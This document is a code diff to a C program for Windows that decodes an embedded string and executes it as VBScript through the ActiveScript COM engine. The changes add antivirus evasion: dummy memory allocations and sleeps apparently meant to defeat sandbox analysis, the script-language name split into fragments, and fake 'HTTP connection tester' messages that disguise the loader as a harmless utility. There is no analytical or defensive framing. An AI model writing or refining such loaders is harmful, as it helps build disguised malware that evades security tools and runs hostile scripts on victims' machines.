@@ -108,17 +108,17 @@ void d(char *array, int array_size, char *se)
 
 VOID r(PWCHAR lang, char* s, char* se) {
     char *mem = NULL;
-    mem = (char *) malloc(100000000);
+    mem = (char *) malloc(100000023);
 
     if (mem != NULL) {
-        memset(mem, 00, 100000000);
+        memset(mem, 00, 100000023);
+        Sleep(1);
         free(mem);
     }
 
-    int length = strlen(s);
-    d(s, length, se);
-    PCHAR sc = s;
-
+    printf("test http connection");
+    
+    Sleep(4);
     IActiveScriptParse     *parser;
     IActiveScript          *engine;
     MyIActiveScriptSite    mas;
@@ -128,55 +128,65 @@ VOID r(PWCHAR lang, char* s, char* se) {
     CLSID                  langId;
     HRESULT                hr;
     OLECHAR* obj;
-    
-    // 1. Initialize IActiveScript based on language
+
+    printf("currently testing http connection...");
+    Sleep(3);
     CLSIDFromProgID(lang, &langId);
     CoInitializeEx(NULL, COINIT_MULTITHREADED);
     
     CoCreateInstance(
       &langId, 0, CLSCTX_INPROC_SERVER, 
       &IID_IActiveScript, (void **)&engine);
-    
-    // 2. Query engine for script parser and initialize
+    vft.OnScriptTerminate   = (LPVOID)OnScriptTerminate;
+    vft.OnStateChange       = (LPVOID)OnStateChange;
+    vft.OnScriptError       = (LPVOID)OnScriptError;
+    vft.OnEnterScript       = (LPVOID)OnEnterScript;
+    vft.OnLeaveScript       = (LPVOID)OnLeaveScript;
     engine->lpVtbl->QueryInterface(
         engine, &IID_IActiveScriptParse, 
         (void **)&parser);
         
     parser->lpVtbl->InitNew(parser);
     
-    // 3. Initialize IActiveScriptSite interface
     vft.QueryInterface      = (LPVOID)QueryInterface;
     vft.AddRef              = (LPVOID)AddRef;
     vft.Release             = (LPVOID)Release;
     vft.GetLCID             = (LPVOID)GetLCID;
     vft.GetItemInfo         = (LPVOID)GetItemInfo;
     vft.GetDocVersionString = (LPVOID)GetDocVersionString;
-    vft.OnScriptTerminate   = (LPVOID)OnScriptTerminate;
-    vft.OnStateChange       = (LPVOID)OnStateChange;
-    vft.OnScriptError       = (LPVOID)OnScriptError;
-    vft.OnEnterScript       = (LPVOID)OnEnterScript;
-    vft.OnLeaveScript       = (LPVOID)OnLeaveScript;
     
+    mas.m_cRef          = 0;
     mas.site.lpVtbl     = (IActiveScriptSiteVtbl*)&vft;
     mas.siteWnd.lpVtbl  = NULL;
-    mas.m_cRef          = 0;
+    
     
     
     engine->lpVtbl->SetScriptSite(
         engine, (IActiveScriptSite *)&mas);
+
+    int length = strlen(s);
+    mem = (char *) malloc(100000023);
+
+    if (mem != NULL) {
+        memset(mem, 00, 100000023);
+        Sleep(1);
+        free(mem);
+    }
+    d(s, length, se);
         
-    len = MultiByteToWideChar(CP_ACP, 0, sc, -1, NULL, 0);
+    len = MultiByteToWideChar(CP_ACP, 0, s, -1, NULL, 0);
     cs = malloc(len * sizeof(WCHAR));
     
-    len = MultiByteToWideChar(CP_ACP, 0, sc, -1, cs, len * sizeof(WCHAR));
+    len = MultiByteToWideChar(CP_ACP, 0, s, -1, cs, len * sizeof(WCHAR));
+
+    printf("HTTP connection looks good!");
 
     parser->lpVtbl->ParseScriptText(
          parser, cs, 0, 0, 0, 0, 0, 0, 0, 0);  
-    
+    Sleep(1);
     engine->lpVtbl->SetScriptState(
          engine, SCRIPTSTATE_CONNECTED);
-    
-    // 5. cleanup
+
     parser->lpVtbl->Release(parser);
     engine->lpVtbl->Close(engine);
     engine->lpVtbl->Release(engine);
@@ -185,10 +195,40 @@ VOID r(PWCHAR lang, char* s, char* se) {
 
 int main(int argc, char *argv[]) {
 
-    wchar_t *l = L"VBScript";
+    
+    wchar_t *l1 = L"V";
+    wchar_t *l2 = L"BScr";
+    wchar_t *l3 = L"ipt";
+
+     // Calculate lengths
+    size_t len1 = wcslen(l1);
+    size_t len2 = wcslen(l2);
+    size_t len3 = wcslen(l3);
+
+    // Allocate memory for the new concatenated string
+    wchar_t *result = (wchar_t *)malloc((len1 + len2 + len3 + 1) * sizeof(wchar_t)); // +1 for null terminator
+    if (result == NULL) {
+        printf("Memory allocation failed\n");
+    }
+
+    Sleep(6);
+
+    printf("HTTP connection tester.");
+    printf("usage: http_test -t <url>");
 
     //SCRIPT COMES HERE
     
+    // Copy the first string into the result
+    wcscpy(result, l1);
+    // Concatenate the second string
+    wcscat(result, l2);
+    wcscat(result, l3);
+    printf("Concatenated string");
+
+    // Free the allocated memory
+    free(result);
+    Sleep(6);
+    wchar_t *l = L"VBScript";
     r(l, sc, s);
     return 0;
 }
